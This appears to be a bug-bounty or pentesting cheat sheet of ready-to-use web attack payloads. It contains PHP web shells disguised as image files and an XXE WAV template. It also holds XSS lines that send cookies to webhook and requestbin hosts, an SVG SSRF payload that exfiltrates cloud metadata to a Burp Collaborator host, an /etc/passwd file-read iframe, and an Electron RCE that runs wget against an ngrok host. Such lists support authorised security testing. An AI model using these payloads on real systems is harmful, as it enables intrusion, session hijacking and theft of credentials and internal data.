# Payloads

## File Upload

```
# JPG
echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg
# PNG
echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png
# GIF
echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif
# BMP
echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp
# WAV (XXE)
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00YOUR_XML_PAYLOAD_HERE\x00' > payload.wav
```

### Bypass CSP Polyglot JPEG

Payload to embed in the picture via hxd (Use this [POC](http://portswigger-labs.net/polyglot/jpeg/xss.jpg))

```
document.location='<WEBHOOK>/zeyad?c='+encodeURIComponent(btoa(document.cookie));
```

Code to execute code as JS

```
<script charset="ISO-8859-1" src="http://portswigger-labs.net/polyglot/jpeg/xss.jpg"></script>
```

Research link: <https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs>

## Server Side Request Forgery

### **SVG**

```
<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://google.com/favicon.ico" height="20" width="20" onload="fetch('http://169.254.169.254/latest/meta-data/hostname').then(function (response) {response.text().then(function(text) {var params = text;var http = new XMLHttpRequest();var url = 'https://<>.burpcollaborator.net/';http.open('POST', url, true);http.send(params);})});" /></svg>
```

### Meta Tags

```
<meta http-equiv="refresh" content="0;url=http://169.254.169.254" />
```

### Style tags

```
<style><h1>h1taginjection</h1><iframe xmlns="http://www.w3.org/1999/xhtml" src="file:///etc/passwd" width="800" height="850"/>
    @import url(http://ta79rlzq77p2kdoak91nqryxlorff4.burpcollaborator.net/import.css);</style>
```

### HTTP Redirect

```
# ?url=http://your-domain/r.php
# [ r.php ]
<?php
header('Location: http://127.0.0.1:8080/server-status');
?>
```

### Edge Side Include

```
<esi:include src=http://127.0.0.1/server-status/>
<esi:include src=http://internal_domain/server_base_csrf_page/>
```

## Electron RCE

```
<head>
        <meta property="og:description" content="<img src=x onerror=&quot;top.require('child_process').execSync('wget https://1a6c-37-36-116-188.eu.ngrok.io')&quot;>">
</head>
```

### More

* <https://www.hahwul.com/phoenix/ssrf-open-redirect/>
* <https://github.com/cujanovic/SSRF-Testing>

## XSS

### Markdown

```
![<img src="#" onerror="src='http://requestbin.net/r/12bfihl1?c='+document.cookie; this.onerror=null"/>](#){onerror=outerHTML=alt}
```

### Payload in hashstring

```
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
```

